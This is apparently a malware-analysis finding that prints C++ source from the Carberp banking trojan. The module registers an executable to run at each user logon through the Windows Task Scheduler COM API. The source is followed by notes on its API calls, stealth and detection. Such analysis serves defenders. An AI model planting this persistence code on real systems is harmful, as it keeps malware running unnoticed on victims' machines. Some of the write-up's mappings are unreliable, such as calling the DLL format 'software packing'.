# Finding 8: Carberp Botnet - Task Scheduler COM API Implementation

## Metadata
- **Repository**: Malware-Collection-master
- **File Path**: `Carberp Botnet/source - absource/pro/all source/schtasks/schtasks.cpp`
- **Language**: C++
- **Malware Family**: Carberp Botnet (Banking Trojan)

## Code Snippet

```cpp
// schtasks.cpp : Defines the exported functions for the DLL application.

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <comdef.h>
#include <taskschd.h>
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <objidl.h>

#pragma comment(lib,"taskschd.lib")
#pragma comment(lib,"comsupp.lib")

// *** TASK SCHEDULER 2.0 API (Windows Vista+) ***
BOOL TaskAddSrv20(LPCWSTR wszTaskName,LPCWSTR wszExecutablePath,LPCWSTR wszTriggerName)
{
    BOOL bResult = FALSE;
    HRESULT Hr;
    
    Hr = CoInitializeEx(NULL,COINIT_MULTITHREADED);
    if (SUCCEEDED(Hr))
    {
        Hr = CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,0,NULL);
        if (SUCCEEDED(Hr))
        {
            ITaskService *pService = NULL;

            // *** CREATE TASK SERVICE INSTANCE ***
            Hr = CoCreateInstance(CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskService,(PVOID*)&pService);  
            if (SUCCEEDED(Hr))
            {
                Hr = pService->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());
                if (SUCCEEDED(Hr))
                {
                    BSTR bFolderName = SysAllocString(L"\\");
                    if (bFolderName)
                    {
                        ITaskFolder *pRootFolder = NULL;

                        Hr = pService->GetFolder(bFolderName,&pRootFolder);
                        if (SUCCEEDED(Hr))
                        {
                            BSTR bTaskName = SysAllocString(wszTaskName);
                            if (bTaskName)
                            {
                                // *** DELETE EXISTING TASK ***
                                pRootFolder->DeleteTask(bTaskName,0);

                                ITaskDefinition *pTask = NULL;

                                // *** CREATE NEW TASK DEFINITION ***
                                Hr = pService->NewTask(0,&pTask);
                                if (SUCCEEDED(Hr))
                                {
                                    ITriggerCollection *pTriggerCollection = NULL;

                                    Hr = pTask->get_Triggers(&pTriggerCollection);
                                    if (SUCCEEDED(Hr))
                                    {
                                        ITrigger *pTrigger = NULL;

                                        // *** CREATE LOGON TRIGGER ***
                                        Hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON,&pTrigger); 
                                        if (SUCCEEDED(Hr))
                                        {
                                            if (TaskAddSrv20SetLogonTrigger(pTrigger,wszTriggerName))
                                            {
                                                bResult = TaskAddSrv20RegisterTask(pTask,pRootFolder,bTaskName,wszExecutablePath);
                                            }

                                            pTrigger->Release();
                                        }

                                        pTriggerCollection->Release();
                                    }
                                
                                    pTask->Release();
                                }
                            
                                SysFreeString(bTaskName);
                            }

                            pRootFolder->Release();
                        }

                        SysFreeString(bFolderName);
                    }
                }

                pService->Release();
            }
        }

        CoUninitialize();
    }

    return bResult;
}

BOOL TaskAddSrv20RegisterTask(ITaskDefinition *pTask,ITaskFolder *pRootFolder,BSTR bTaskName,LPCWSTR wszExecutablePath)
{  
    BOOL bResult = FALSE;
    HRESULT Hr;
    IActionCollection *pActionCollection = NULL;

    Hr = pTask->get_Actions(&pActionCollection);
    if (SUCCEEDED(Hr))
    {
        IAction *pAction = NULL;

        Hr = pActionCollection->Create(TASK_ACTION_EXEC,&pAction);
        if (SUCCEEDED(Hr))
        {
            IExecAction *pExecAction = NULL;

            Hr = pAction->QueryInterface(IID_IExecAction,(PVOID*)&pExecAction);
            if (SUCCEEDED(Hr))
            {
                BSTR bExecutablePath = SysAllocString(wszExecutablePath);
                if (bExecutablePath)
                {
                    // *** SET EXECUTABLE PATH ***
                    Hr = pExecAction->put_Path(bExecutablePath); 
                    if (SUCCEEDED(Hr))
                    {
                        IRegisteredTask *pRegisteredTask = NULL;
                        VARIANT varPassword;
                        varPassword.vt = VT_EMPTY;
    
                        // *** REGISTER TASK ***
                        Hr = pRootFolder->RegisterTaskDefinition(bTaskName,pTask,TASK_CREATE_OR_UPDATE,_variant_t(),varPassword,TASK_LOGON_INTERACTIVE_TOKEN,_variant_t(),&pRegisteredTask);
                        bResult = SUCCEEDED(Hr);
                        if (bResult)
                        {
                            pRegisteredTask->Release();
                        }
                    }

                    SysFreeString(bExecutablePath);
                }

                pExecAction->Release();
            }

            pAction->Release();
        }

        pActionCollection->Release();
    }

    return bResult;
}

// *** EXPORTED FUNCTION ***
BOOL SchTaskAdd(LPCWSTR pwszFilePath,LPCWSTR pwszTaskName)
{
    BOOL bResult;

    // Try Task Scheduler 1.0 (Windows XP/2003) first
    bResult = TaskAddSch10(pwszTaskName,pwszFilePath);
    if (!bResult) 
    {
        // Fall back to Task Scheduler 2.0 (Vista+)
        bResult = TaskAddSrv20(pwszTaskName,pwszFilePath,L"Trigger1");	
    }

    return bResult;
}

extern "C"
{
void EXPORT_API start(char* exe)
{
    WCHAR buf[MAX_PATH + MAX_PATH];
    if( SchTaskAdd( L"c:\\test\\dllloader.exe", L"MyTask" ) )
        OutputDebugStringA("AutoRun TRUE");
    else
        OutputDebugStringA("AutoRun FALSE");
}
}
```

## Analysis

**What it does:**
Carberp is a sophisticated banking trojan that implements scheduled task persistence using native Windows COM APIs rather than command-line tools. This DLL module (`schtasks.dll`) provides a programmatic interface for creating scheduled tasks with logon triggers. The implementation supports both Task Scheduler 1.0 (Windows XP/2003) and 2.0 (Vista+) APIs.

**How it uses Windows Scheduled Tasks (T1053.005):**

**Task Scheduler 2.0 API (Vista+):**
- **ITaskService**: Main task scheduler service interface
- **ITaskFolder**: Accesses root task folder
- **ITaskDefinition**: Defines new task
- **ITriggerCollection**: Manages task triggers
- **ITrigger**: Creates TASK_TRIGGER_LOGON trigger
- **IActionCollection**: Manages task actions
- **IExecAction**: Sets executable path
- **RegisterTaskDefinition**: Registers with TASK_CREATE_OR_UPDATE and TASK_LOGON_INTERACTIVE_TOKEN

**Key API Calls:**
1. `CoCreateInstance(CLSID_TaskScheduler)` - Creates Task Scheduler instance
2. `pService->Connect()` - Connects to Task Scheduler service
3. `pService->GetFolder(L"\\")` - Gets root task folder
4. `pRootFolder->DeleteTask()` - Removes existing task with same name
5. `pService->NewTask()` - Creates new task definition
6. `pTriggerCollection->Create(TASK_TRIGGER_LOGON)` - Creates logon trigger
7. `pActionCollection->Create(TASK_ACTION_EXEC)` - Creates execution action
8. `pExecAction->put_Path()` - Sets malware executable path
9. `pRootFolder->RegisterTaskDefinition()` - Registers task with TASK_LOGON_INTERACTIVE_TOKEN

**Evasion/Stealth Techniques:**
1. **COM API usage**: Bypasses command-line monitoring of `schtasks.exe`
2. **No process creation**: Direct API calls avoid spawning child processes
3. **Library-based**: Packaged as DLL for injection into other processes
4. **Dual compatibility**: Supports both XP and Vista+ for broad target coverage
5. **Proper cleanup**: Deletes existing tasks before creating new ones to avoid errors
6. **Interactive token**: Uses TASK_LOGON_INTERACTIVE_TOKEN for standard user compatibility
7. **Empty password variant**: Uses VT_EMPTY for password to work with current user context

**Advanced Implementation Details:**
1. **COM initialization**: 
   - `COINIT_MULTITHREADED` for thread safety
   - `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` for secure communication
   - `RPC_C_IMP_LEVEL_IMPERSONATE` for impersonation rights

2. **Memory management**: Proper BSTR allocation/freeing with `SysAllocString`/`SysFreeString`

3. **Error handling**: Checks HRESULT at each step

4. **Resource cleanup**: Releases all COM interfaces properly

**Carberp Context:**
Carberp was a sophisticated banking trojan sold on underground forums. Its use of COM APIs instead of command-line tools demonstrates advanced malware engineering:
- Harder to detect with process monitoring
- More stealthy than command-line execution
- Better integration with Windows
- Professional code quality

**Detection Challenges:**
- No suspicious command-line execution
- No child process creation
- Requires monitoring of Task Scheduler COM API calls
- ETW (Event Tracing for Windows) required for detection
- Scheduled Task/Job creation events (Event ID 4698) still generated

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary)
- **T1106**: Native API (COM API usage)
- **T1055**: Process Injection (DLL designed for injection)
- **T1027.002**: Obfuscated Files or Information: Software Packing (DLL format)
